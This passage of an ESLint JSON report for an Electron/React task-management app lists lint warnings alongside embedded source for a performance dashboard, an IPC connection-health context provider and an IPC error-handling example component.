'orange'\n    }\n  ]\n\n  return (\n    <motion.div \n      className=\"h-full overflow-auto p-6\"\n      initial={{ opacity: 0 }}\n      animate={{ opacity: 1 }}\n      transition={{ duration: 0.5 }}\n    >\n      {/* Header */}\n      <motion.div \n        className=\"mb-8\"\n        initial={{ y: -20, opacity: 0 }}\n        animate={{ y: 0, opacity: 1 }}\n        transition={{ duration: 0.5 }}\n      >\n        <div className=\"flex items-center justify-between\">\n          <div>\n            <h2 className=\"text-3xl font-bold gradient-text mb-2\">Performance Dashboard</h2>\n            <p className=\"text-muted-foreground\">\n              Real-time monitoring of system and application performance metrics\n            </p>\n          </div>\n          \n          <div className=\"flex items-center space-x-3\">\n            <button\n              onClick={() => setIsMonitoring(!isMonitoring)}\n              className={cn(\n                \"flex items-center space-x-2 px-4 py-2 rounded-lg font-medium transition-colors\",\n                isMonitoring \n                  ? \"bg-red-100 text-red-700 hover:bg-red-200\" \n                  : \"bg-emerald-100 text-emerald-700 hover:bg-emerald-200\"\n              )}\n            >\n              {isMonitoring ? <Pause className=\"w-4 h-4\" /> : <Play className=\"w-4 h-4\" />}\n              <span>{isMonitoring ? 'Stop Monitoring' : 'Start Monitoring'}</span>\n            </button>\n            \n            <button className=\"p-2 rounded-lg bg-gray-100 text-gray-600 hover:bg-gray-200 transition-colors\">\n              <Settings className=\"w-5 h-5\" />\n            </button>\n            \n            <button className=\"p-2 rounded-lg bg-gray-100 text-gray-600 hover:bg-gray-200 transition-colors\">\n              <Download className=\"w-5 h-5\" />\n            </button>\n          </div>\n        </div>\n        \n        {/* Status indicator */}\n        <div className=\"flex items-center mt-4 space-x-4\">\n          <div className=\"flex items-center space-x-2\">\n            <div className={cn(\n              \"w-3 h-3 rounded-full\",\n              isMonitoring ? \"bg-emerald-500 animate-pulse\" : \"bg-gray-400\"\n            )} />\n            <span className=\"text-sm text-muted-foreground\">\n              {isMonitoring ? 'Monitoring Active' : 'Monitoring Stopped'}\n            </span>\n          </div>\n          \n          {currentMetrics && (\n            <div className=\"text-sm text-muted-foreground\">\n              Last Update: {new Date(currentMetrics.timestamp).toLocaleTimeString()}\n            </div>\n          )}\n        </div>\n      </motion.div>\n\n      {/* Metrics Grid */}\n      <div className=\"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8\">\n        {metrics.map((metric, index) => {\n          const { value, unit, status } = getMetricValue(metric.id)\n          return (\n            <MetricCard \n              key={metric.id}\n              title={metric.title}\n              value={value.toFixed(1)}\n              unit={unit}\n              status={status}\n              icon={metric.icon}\n              color={metric.color}\n              index={index}\n            />\n          )\n        })}\n      </div>\n\n      {/* Charts Section */}\n      <div className=\"grid grid-cols-1 lg:grid-cols-2 gap-6 mb-8\">\n        <ChartWidget\n          title=\"CPU Usage\"\n          metricId=\"cpu_usage\"\n          data={metricsHistory}\n          chartType=\"area\"\n          index={0}\n        />\n        \n        <ChartWidget\n          title=\"Memory Usage\"\n          metricId=\"memory_usage\"\n          data={metricsHistory}\n          chartType=\"line\"\n          index={1}\n        />\n        \n        <ChartWidget\n          title=\"Frame Rate\"\n          metricId=\"fps\"\n          data={metricsHistory}\n          chartType=\"gauge\"\n          height={250}\n          index={2}\n        />\n        \n        <ChartWidget\n          title=\"Heap Memory\"\n          metricId=\"memory_heap_used\"\n          data={metricsHistory}\n          chartType=\"bar\"\n          index={3}\n        />\n      </div>\n\n      {/* Alerts Section */}\n      {alerts.length > 0 && (\n        <motion.div\n          initial={{ opacity: 0, y: 20 }}\n          animate={{ opacity: 1, y: 0 }}\n          className=\"bg-card border border-border/50 rounded-xl p-6 glass-morphism\"\n        >\n          <div className=\"flex items-center space-x-2 mb-4\">\n            <AlertTriangle className=\"w-5 h-5 text-orange-500\" />\n            <h3 className=\"text-lg font-semibold\">Active Alerts</h3>\n          </div>\n          \n          <div className=\"space-y-3\">\n            {alerts.map((alert, index) => (\n              <div \n                key={index}\n                className={cn(\n                  \"p-3 rounded-lg border\",\n                  alert.severity === 'critical' ? \"bg-red-50 border-red-200\" : \"bg-yellow-50 border-yellow-200\"\n                )}\n              >\n                <div className=\"flex items-center justify-between\">\n                  <span className=\"font-medium\">{alert.type}</span>\n                  <span className={cn(\n                    \"px-2 py-1 rounded-full text-xs font-medium\",\n                    alert.severity === 'critical' ? \"bg-red-100 text-red-700\" : \"bg-yellow-100 text-yellow-700\"\n                  )}>\n                    {alert.severity.toUpperCase()}\n                  </span>\n                </div>\n                <p className=\"text-sm text-muted-foreground mt-1\">{alert.message}</p>\n              </div>\n            ))}\n          </div>\n        </motion.div>\n      )}\n    </motion.div>\n  )\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/views/TaskListView.tsx","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/views/TimelineView.tsx","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/config/errorHandling.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/contexts/IPCContext.tsx","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":33,"column":42,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":33,"endColumn":45,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[997,1000],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[997,1000],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":68,"column":39,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":68,"endColumn":42,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1911,1914],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1911,1914],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":191,"column":61,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":191,"endColumn":64,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[5710,5713],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[5710,5713],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"React Hook useEffect has a missing dependency: 'monitoringInterval'. Either include it or remove the dependency array.","line":257,"column":6,"nodeType":"ArrayExpression","endLine":257,"endColumn":44,"suggestions":[{"desc":"Update the dependencies array to be: [autoStartMonitoring, monitoringInterval, startMonitoring]","fix":{"range":[7435,7473],"text":"[autoStartMonitoring, monitoringInterval, startMonitoring]"}}]},{"ruleId":"react-refresh/only-export-components","severity":1,"message":"Fast refresh only works when a file only exports components. Use a new file to share constants or functions between components.","line":301,"column":17,"nodeType":"Identifier","messageId":"namedExport","endLine":301,"endColumn":23},{"ruleId":"react-refresh/only-export-components","severity":1,"message":"Fast refresh only works when a file only exports components. Use a new file to share constants or functions between components.","line":314,"column":17,"nodeType":"Identifier","messageId":"namedExport","endLine":314,"endColumn":30},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":319,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":319,"endColumn":19,"suggestions":[{"fix":{"range":[8778,8895],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"react-refresh/only-export-components","severity":1,"message":"Fast refresh only works when a file only exports components. Use a new file to share constants or functions between components.","line":336,"column":17,"nodeType":"Identifier","messageId":"namedExport","endLine":336,"endColumn":27},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":339,"column":45,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":339,"endColumn":48,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[9297,9300],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[9297,9300],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":341,"column":14,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":341,"endColumn":17,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[9340,9343],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[9340,9343],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":10,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * IPC Context Provider for Electron API Status Management (2025)\n * \n * This context provides application-wide access to IPC availability status,\n * connection health monitoring, and centralized IPC error handling.\n * \n * Following 2025 React patterns for context management and error boundaries.\n */\n\nimport { createContext, useContext, useEffect, useState, useCallback, ReactNode } from 'react';\nimport { ipcWrapper, IPCErrorCode, type IPCResponse } from '@/lib/ipc';\n\n// IPC Context state interface\nexport interface IPCContextState {\n  // Connection status\n  isAvailable: boolean;\n  isHealthy: boolean;\n  availableMethods: string[];\n  lastHealthCheck: Date | null;\n  \n  // Error tracking\n  errorCount: number;\n  lastError: string | null;\n  connectionErrors: number;\n  \n  // Status monitoring\n  isMonitoring: boolean;\n  healthCheckInterval: number;\n  \n  // Methods\n  refreshStatus: () => Promise<void>;\n  performHealthCheck: () => Promise<boolean>;\n  reportError: (error: string, context?: any) => void;\n  clearErrors: () => void;\n  startMonitoring: () => void;\n  stopMonitoring: () => void;\n}\n\n// Default context state\nconst _defaultContextState: IPCContextState = {\n  isAvailable: false,\n  isHealthy: false,\n  availableMethods: [],\n  lastHealthCheck: null,\n  errorCount: 0,\n  lastError: null,\n  connectionErrors: 0,\n  isMonitoring: false,\n  healthCheckInterval: 30000, // 30 seconds\n  refreshStatus: async () => {},\n  performHealthCheck: async () => false,\n  reportError: () => {},\n  clearErrors: () => {},\n  startMonitoring: () => {},\n  stopMonitoring: () => {}\n};\n\n// Create context\nconst IPCContext = createContext<IPCContextState>(_defaultContextState);\n\n// Provider props\ninterface IPCProviderProps {\n  children: ReactNode;\n  healthCheckInterval?: number;\n  autoStartMonitoring?: boolean;\n  onConnectionLost?: () => void;\n  onConnectionRestored?: () => void;\n  onError?: (error: string, context?: any) => void;\n}\n\n/**\n * IPC Provider component that manages Electron API connection status\n */\nexport function IPCProvider({\n  children,\n  healthCheckInterval = 30000,\n  autoStartMonitoring = true,\n  onConnectionLost,\n  onConnectionRestored,\n  onError\n}: IPCProviderProps) {\n  // Core state\n  const [isAvailable, setIsAvailable] = useState(false);\n  const [isHealthy, setIsHealthy] = useState(false);\n  const [availableMethods, setAvailableMethods] = useState<string[]>([]);\n  const [lastHealthCheck, setLastHealthCheck] = useState<Date | null>(null);\n  \n  // Error tracking\n  const [errorCount, setErrorCount] = useState(0);\n  const [lastError, setLastError] = useState<string | null>(null);\n  const [connectionErrors, setConnectionErrors] = useState(0);\n  \n  // Monitoring state\n  const [isMonitoring, setIsMonitoring] = useState(false);\n  const [monitoringInterval, setMonitoringInterval] = useState<NodeJS.Timeout | null>(null);\n\n  /**\n   * Perform comprehensive health check of IPC connection\n   */\n  const performHealthCheck = useCallback(async (): Promise<boolean> => {\n    try {\n      // Check basic availability\n      const available = ipcWrapper.isAvailable();\n      setIsAvailable(available);\n      \n      if (!available) {\n        setIsHealthy(false);\n        setAvailableMethods([]);\n        setConnectionErrors(prev => prev + 1);\n        \n        if (isHealthy) {\n          // Connection was healthy, now lost\n          onConnectionLost?.();\n        }\n        \n        setLastHealthCheck(new Date());\n        return false;\n      }\n\n      // Get available methods\n      const methods = ipcWrapper.getAvailableMethods();\n      setAvailableMethods(methods);\n\n      // Test a basic method to ensure IPC is working\n      let healthy = true;\n      if (methods.length > 0) {\n        try {\n          // Try a lightweight method that should always work\n          const testMethod = methods.includes('getVersion') ? 'getVersion' : methods[0];\n          if (testMethod) {\n            const response: IPCResponse = await ipcWrapper.invoke(testMethod);\n            healthy = response.success;\n            \n            if (!healthy && response.error) {\n              setLastError(`Health check failed: ${response.error.message}`);\n              setErrorCount(prev => prev + 1);\n            }\n          } else {\n            healthy = false;\n            setLastError('No IPC methods available for health check');\n          }\n        } catch (error) {\n          healthy = false;\n          setLastError(`Health check error: ${error}`);\n          setErrorCount(prev => prev + 1);\n          setConnectionErrors(prev => prev + 1);\n        }\n      }\n\n      const wasHealthy = isHealthy;\n      setIsHealthy(healthy);\n      \n      // Connection state change notifications\n      if (!wasHealthy && healthy) {\n        onConnectionRestored?.();\n        setConnectionErrors(0); // Reset connection error count on recovery\n      } else if (wasHealthy && !healthy) {\n        onConnectionLost?.();\n        setConnectionErrors(prev => prev + 1);\n      }\n\n      setLastHealthCheck(new Date());\n      return healthy;\n\n    } catch (error) {\n      setIsAvailable(false);\n      setIsHealthy(false);\n      setConnectionErrors(prev => prev + 1);\n      setLastError(`Health check exception: ${error}`);\n      setErrorCount(prev => prev + 1);\n      setLastHealthCheck(new Date());\n      \n      if (isHealthy) {\n        onConnectionLost?.();\n      }\n      \n      return false;\n    }\n  }, [isHealthy, onConnectionLost, onConnectionRestored]);\n\n  /**\n   * Refresh IPC status manually\n   */\n  const refreshStatus = useCallback(async (): Promise<void> => {\n    await performHealthCheck();\n  }, [performHealthCheck]);\n\n  /**\n   * Report an error from IPC operations\n   */\n  const reportError = useCallback((error: string, context?: any) => {\n    setLastError(error);\n    setErrorCount(prev => prev + 1);\n    \n    // Call external error handler\n    onError?.(error, context);\n    \n    // If it's a connection-related error, increment connection errors\n    if (error.toLowerCase().includes('connection') || \n        error.toLowerCase().includes('unavailable') ||\n        error.toLowerCase().includes('timeout')) {\n      setConnectionErrors(prev => prev + 1);\n    }\n  }, [onError]);\n\n  /**\n   * Clear error counters and messages\n   */\n  const clearErrors = useCallback(() => {\n    setErrorCount(0);\n    setLastError(null);\n    setConnectionErrors(0);\n  }, []);\n\n  /**\n   * Start continuous health monitoring\n   */\n  const startMonitoring = useCallback(() => {\n    if (isMonitoring || monitoringInterval) return;\n    \n    setIsMonitoring(true);\n    \n    // Perform initial health check\n    performHealthCheck();\n    \n    // Set up interval for continuous monitoring\n    const interval = setInterval(() => {\n      performHealthCheck();\n    }, healthCheckInterval);\n    \n    setMonitoringInterval(interval);\n  }, [isMonitoring, monitoringInterval, performHealthCheck, healthCheckInterval]);\n\n  /**\n   * Stop health monitoring\n   */\n  const stopMonitoring = useCallback(() => {\n    if (!isMonitoring || !monitoringInterval) return;\n    \n    clearInterval(monitoringInterval);\n    setMonitoringInterval(null);\n    setIsMonitoring(false);\n  }, [isMonitoring, monitoringInterval]);\n\n  // Initialize monitoring on mount if auto-start is enabled\n  useEffect(() => {\n    if (autoStartMonitoring) {\n      startMonitoring();\n    }\n\n    // Cleanup on unmount\n    return () => {\n      if (monitoringInterval) {\n        clearInterval(monitoringInterval);\n      }\n    };\n  }, [autoStartMonitoring, startMonitoring]);\n\n  // Listen for window focus to perform health check\n  useEffect(() => {\n    const handleFocus = () => {\n      // Perform health check when window regains focus\n      if (isMonitoring) {\n        performHealthCheck();\n      }\n    };\n\n    window.addEventListener('focus', handleFocus);\n    return () => window.removeEventListener('focus', handleFocus);\n  }, [isMonitoring, performHealthCheck]);\n\n  // Context value\n  const contextValue: IPCContextState = {\n    isAvailable,\n    isHealthy,\n    availableMethods,\n    lastHealthCheck,\n    errorCount,\n    lastError,\n    connectionErrors,\n    isMonitoring,\n    healthCheckInterval,\n    refreshStatus,\n    performHealthCheck,\n    reportError,\n    clearErrors,\n    startMonitoring,\n    stopMonitoring\n  };\n\n  return (\n    <IPCContext.Provider value={contextValue}>\n      {children}\n    </IPCContext.Provider>\n  );\n}\n\n/**\n * Hook to access IPC context\n */\nexport function useIPC(): IPCContextState {\n  const context = useContext(IPCContext);\n  \n  if (!context) {\n    throw new Error('useIPC must be used within an IPCProvider');\n  }\n  \n  return context;\n}\n\n/**\n * Hook for components that require IPC to be available\n */\nexport function useRequireIPC(fallbackMessage?: string) {\n  const ipc = useIPC();\n  \n  useEffect(() => {\n    if (!ipc.isAvailable) {\n      console.warn(\n        fallbackMessage || \n        'Component requires IPC but Electron API is not available'\n      );\n    }\n  }, [ipc.isAvailable, fallbackMessage]);\n  \n  return {\n    ...ipc,\n    isRequired: true,\n    fallbackMessage: fallbackMessage || 'This feature requires the desktop application'\n  };\n}\n\n/**\n * Hook for safe IPC operations with automatic error reporting\n */\nexport function useSafeIPC() {\n  const { reportError, isAvailable, isHealthy } = useIPC();\n  \n  const safeInvoke = useCallback(async <T = any>(\n    methodName: string,\n    ...args: any[]\n  ): Promise<IPCResponse<T>> => {\n    try {\n      const response = await ipcWrapper.invoke<T>(methodName, ...args);\n      \n      // Report errors to context\n      if (!response.success && response.error) {\n        reportError(\n          `${response.error.code}: ${response.error.message}`,\n          { methodName, args, error: response.error }\n        );\n      }\n      \n      return response;\n    } catch (error) {\n      const errorMessage = `IPC invoke failed: ${error}`;\n      reportError(errorMessage, { methodName, args, error });\n      \n      return {\n        success: false,\n        error: {\n          code: IPCErrorCode.SYSTEM_ERROR,\n          message: errorMessage,\n          timestamp: new Date().toISOString(),\n          retryable: true\n        }\n      };\n    }\n  }, [reportError]);\n  \n  return {\n    invoke: safeInvoke,\n    isAvailable,\n    isHealthy,\n    reportError\n  };\n}\n\nexport default IPCContext;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/examples/IPCErrorBoundaryExample.tsx","messages":[{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":46,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":46,"endColumn":24,"suggestions":[{"fix":{"range":[1561,1610],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'isAvailable' is assigned a value but never used.","line":89,"column":5,"nodeType":null,"messageId":"unusedVar","endLine":89,"endColumn":16},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'safeInvoke' is assigned a value but never used.","line":91,"column":5,"nodeType":null,"messageId":"unusedVar","endLine":91,"endColumn":15},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'hasError' is assigned a value but never used.","line":92,"column":5,"nodeType":null,"messageId":"unusedVar","endLine":92,"endColumn":13},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":99,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":99,"endColumn":19,"suggestions":[{"fix":{"range":[2775,2820],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":118,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":118,"endColumn":20,"suggestions":[{"fix":{"range":[3207,3253],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"React Hook useEffect has a missing dependency: 'loadPaths'. Either include it or remove the dependency array.","line":126,"column":6,"nodeType":"ArrayExpression","endLine":126,"endColumn":18,"suggestions":[{"desc":"Update the dependencies array to be: [canProceed, loadPaths]","fix":{"range":[3349,3361],"text":"[canProceed, loadPaths]"}}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":241,"column":42,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":241,"endColumn":45,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[6912,6915],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[6912,6915],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":273,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":273,"endColumn":20,"suggestions":[{"fix":{"range":[7640,7688],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":309,"column":52,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":309,"endColumn":55,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[8660,8663],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[8660,8663],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":310,"column":52,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":310,"endColumn":55,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[8723,8726],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[8723,8726],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":378,"column":31,"nodeType":"MemberExpression","messageId":"unexpected","endLine":378,"endColumn":42},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":379,"column":35,"nodeType":"MemberExpression","messageId":"unexpected","endLine":379,"endColumn":46},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":380,"column":27,"nodeType":"MemberExpression","messageId":"unexpected","endLine":380,"endColumn":39}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":14,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * IPC Error Boundary Integration Example (2025)\n * \n * This example demonstrates how to integrate the complete IPC error boundary\n * system into TaskMaster components, showing best practices for implementation.\n * \n * Following 2025 patterns for error handling, user experience, and resilience.\n */\n\nimport { useState, useEffect } from 'react';\nimport { motion } from 'framer-motion';\nimport { AlertTriangle } from 'lucide-react';\n\n// Import our IPC error boundary system\nimport { IPCProvider, useIPC, useSafeIPC } from '@/contexts/IPCContext';\nimport { withIPCErrorHandling, useIPCErrorHandling } from '@/components/error/withIPCErrorHandling';\nimport { IPCStatusNotification } from '@/components/error/IPCStatusNotification';\nimport { services } from '@/lib/services';\nimport { ipcCritical } from '@/lib/ipcRetry';\n\n/**\n * Example component using HOC pattern\n */\nconst _AppInfoDisplayHOC = withIPCErrorHandling(\n  function AppInfoDisplay() {\n    const [appInfo, setAppInfo] = useState<{\n      version?: string;\n      platform?: string;\n    }>({});\n    const [loading, setLoading] = useState(true);\n\n    useEffect(() => {\n      const loadAppInfo = async () => {\n        try {\n          // Use service layer with built-in error handling\n          const [versionResult, platformResult] = await Promise.all([\n            services.app.getVersion(),\n            services.app.getPlatform()\n          ]);\n\n          setAppInfo({\n            version: versionResult.data,\n            platform: platformResult.data\n          });\n        } catch (error) {\n          console.error('Failed to load app info:', error);\n        } finally {\n          setLoading(false);\n        }\n      };\n\n      loadAppInfo();\n    }, []);\n\n    if (loading) {\n      return <div className=\"animate-pulse\">Loading app information...</div>;\n    }\n\n    return (\n      <div className=\"bg-card p-4 rounded-lg border\">\n        <h3 className=\"font-semibold mb-2\">Application Information</h3>\n        <div className=\"space-y-1 text-sm\">\n          <div>Version: {appInfo.version || 'Unknown'}</div>\n          <div>Platform: {appInfo.platform || 'Unknown'}</div>\n        </div>\n      </div>\n    );\n  },\n  {\n    requiresIPC: true,\n    gracefulDegradation: false,\n    retryable: true,\n    showConnectionStatus: false\n  }\n);\n\n/**\n * Example component using hook pattern\n */\nfunction FileSystemExplorer() {\n  const [paths, setPaths] = useState<{\n    documents?: string;\n    appData?: string;\n  }>({});\n  const [loading, setLoading] = useState(false);\n\n  // Use the IPC error handling hook\n  const {\n    isAvailable,\n    isHealthy,\n    safeInvoke,\n    hasError,\n    canProceed,\n    shouldShowFallback\n  } = useIPCErrorHandling({\n    requiresIPC: true,\n    gracefulDegradation: true,\n    onIPCError: (error) => {\n      console.warn('FileSystem IPC Error:', error);\n    }\n  });\n\n  const loadPaths = async () => {\n    if (!canProceed) return;\n\n    setLoading(true);\n    try {\n      const [docsResult, appDataResult] = await Promise.all([\n        services.fs.getDocumentsPath(),\n        services.fs.getAppDataPath()\n      ]);\n\n      setPaths({\n        documents: docsResult.data,\n        appData: appDataResult.data\n      });\n    } catch (error) {\n      console.error('Failed to load paths:', error);\n    } finally {\n      setLoading(false);\n    }\n  };\n\n  useEffect(() => {\n    loadPaths();\n  }, [canProceed]);\n\n  // Show fallback UI if IPC is required but unavailable\n  if (shouldShowFallback) {\n    return (\n      <div className=\"bg-yellow-50 border border-yellow-200 rounded-lg p-4\">\n        <div className=\"flex items-center gap-2 text-yellow-800\">\n          <AlertTriangle className=\"w-4 h-4\" />\n          <span className=\"text-sm font-medium\">Desktop Features Required</span>\n        </div>\n        <p className=\"text-sm text-yellow-700 mt-1\">\n          File system access requires the desktop application.\n        </p>\n      </div>\n    );\n  }\n\n  return (\n    <div className=\"bg-card p-4 rounded-lg border\">\n      <div className=\"flex items-center justify-between mb-3\">\n        <h3 className=\"font-semibold\">File System Paths</h3>\n        <button\n          onClick={loadPaths}\n          disabled={loading || !canProceed}\n          className=\"text-xs bg-primary text-primary-foreground px-2 py-1 rounded disabled:opacity-50\"\n        >\n          {loading ? 'Loading...' : 'Refresh'}\n        </button>\n      </div>\n\n      {!isHealthy && (\n        <div className=\"mb-3 p-2 bg-yellow-50 border border-yellow-200 rounded text-xs text-yellow-800\">\n          Connection issues detected. Some information may be cached.\n        </div>\n      )}\n\n      <div className=\"space-y-2 text-sm\">\n        <div>\n          <span className=\"font-medium\">Documents:</span>{' '}\n          {paths.documents || 'Not available'}\n        </div>\n        <div>\n          <span className=\"font-medium\">App Data:</span>{' '}\n          {paths.appData || 'Not available'}\n        </div>\n      </div>\n    </div>\n  );\n}\n\n/**\n * Example of critical operations with retry\n */\nfunction CriticalOperationExample() {\n  const [result, setResult] = useState<string | null>(null);\n  const [loading, setLoading] = useState(false);\n  const [error, setError] = useState<string | null>(null);\n  const safeIPC = useSafeIPC();\n\n  const performCriticalOperation = async () => {\n    setLoading(true);\n    setError(null);\n    \n    try {\n      // Example of critical operation with maximum retry attempts\n      const response = await ipcCritical.invoke<string>(\n        'getVersion' // Using getVersion as an example critical operation\n      );\n\n      if (response.success) {\n        setResult(`Critical operation successful: ${response.data}`);\n      } else {\n        setError(response.error?.message || 'Operation failed');\n      }\n    } catch (error) {\n      setError(`Critical operation failed: ${error}`);\n    } finally {\n      setLoading(false);\n    }\n  };\n\n  return (\n    <div className=\"bg-card p-4 rounded-lg border\">\n      <h3 className=\"font-semibold mb-3\">Critical Operation Example</h3>\n      \n      <motion.button\n        whileHover={{ scale: 1.05 }}\n        whileTap={{ scale: 0.95 }}\n        onClick={performCriticalOperation}\n        disabled={loading || !safeIPC.isAvailable}\n        className=\"flex items-center gap-2 bg-red-600 text-white px-3 py-2 rounded text-sm disabled:opacity-50\"\n      >\n        <AlertTriangle className=\"w-4 h-4\" />\n        {loading ? 'Processing...' : 'Execute Critical Operation'}\n      </motion.button>\n\n      {result && (\n        <div className=\"mt-3 p-2 bg-green-50 border border-green-200 rounded text-sm text-green-800\">\n          {result}\n        </div>\n      )}\n\n      {error && (\n        <div className=\"mt-3 p-2 bg-red-50 border border-red-200 rounded text-sm text-red-800\">\n          {error}\n        </div>\n      )}\n    </div>\n  );\n}\n\n/**\n * Example of batch operations\n */\nfunction BatchOperationExample() {\n  const [results, setResults] = useState<any[]>([]);\n  const [loading, setLoading] = useState(false);\n\n  const performBatchOperations = async () => {\n    setLoading(true);\n    \n    try {\n      const batchResult = await services.batch.executeBatch([\n        {\n          method: 'getVersion',\n          args: [],\n          priority: 'high',\n          allowFailure: false\n        },\n        {\n          method: 'getPlatform',\n          args: [],\n          priority: 'normal',\n          allowFailure: true\n        },\n        {\n          method: 'getAppDataPath',\n          args: [],\n          priority: 'low',\n          allowFailure: true\n        }\n      ]);\n\n      if (batchResult.success) {\n        setResults(batchResult.data || []);\n      }\n    } catch (error) {\n      console.error('Batch operation failed:', error);\n    } finally {\n      setLoading(false);\n    }\n  };\n\n  return (\n    <div className=\"bg-card p-4 rounded-lg border\">\n      <h3 className=\"font-semibold mb-3\">Batch Operations Example</h3>\n      \n      <button\n        onClick={performBatchOperations}\n        disabled={loading}\n        className=\"bg-blue-600 text-white px-3 py-2 rounded text-sm disabled:opacity-50\"\n      >\n        {loading ? 'Processing...' : 'Execute Batch Operations'}\n      </button>\n\n      {results.length > 0 && (\n        <div className=\"mt-3 space-y-1\">\n          <h4 className=\"text-sm 